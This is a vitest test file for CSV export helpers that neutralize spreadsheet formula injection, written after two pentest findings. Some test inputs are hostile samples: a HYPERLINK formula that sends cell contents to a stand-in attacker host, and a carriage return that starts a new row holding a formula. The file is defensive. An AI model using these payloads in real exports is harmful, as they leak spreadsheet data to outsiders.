import { describe, expect, it } from 'vitest';
import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { csvCell, neutralizeFormula } from '../src/lib/csv';

/**
 * Pentest 2026-10-07, finding L6: a free-text field that starts with a
 * formula trigger executes when the export is opened in a spreadsheet.
 */
describe('neutralizeFormula', () => {
  it('prefixes every formula trigger with a single quote', () => {
    for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
      expect(neutralizeFormula(`${lead}cmd`)).toBe(`'${lead}cmd`);
    }
    expect(neutralizeFormula('=HYPERLINK("https://evil.example/?"&A1,"open")')).toBe(
      `'=HYPERLINK("https://evil.example/?"&A1,"open")`,
    );
  });

  it('leaves ordinary text, numbers, dates, and empty cells alone', () => {
    for (const value of ['Dana', '2026-03-01', '12', '', 'a=b', ' -not a lead', 'Q1', 'in-progress']) {
      expect(neutralizeFormula(value)).toBe(value);
    }
  });
});

/**
 * Pentest 2026-11-22, finding N3: the October fix covered three exporters and
 * missed the ones with a private cell() helper. Two of those (skills matrix
 * member names, automation ROI task names) carry text the user typed.
 */
describe('csvCell', () => {
  it('neutralizes first, then quotes', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('=HYPERLINK("https://evil.example","x")')).toBe(`"'=HYPERLINK(""https://evil.example"",""x"")"`);
    expect(csvCell('Doe, Jane')).toBe('"Doe, Jane"');
    expect(csvCell('plain')).toBe('plain');
    expect(csvCell('')).toBe('');
  });

  it('quotes a bare carriage return as well as a line feed', () => {
    // Some readers end a row on a lone CR; unquoted, the text after it would
    // start a new row whose first cell could be a formula.
    expect(csvCell('a\r=cmd')).toBe('"a\r=cmd"');
    expect(csvCell('a\n=cmd')).toBe('"a\n=cmd"');
  });

  it('is the only way a library module builds a CSV cell', () => {
    // A private quote-only helper is exactly how the gap survived October.
    const lib = fileURLToPath(new URL('../src/lib/', import.meta.url));
    const offenders: string[] = [];
    for (const name of readdirSync(lib).filter((n) => n.endsWith('.ts') && n !== 'csv.ts')) {
      const source = readFileSync(`${lib}${name}`, 'utf8');
      if (!/Csv\b/.test(source)) continue;
      if (/replace\(\/"\/g, '""'\)/.test(source) && !/neutralizeFormula|csvCell/.test(source)) offenders.push(name);
    }
    expect(offenders).toEqual([]);
  });
});
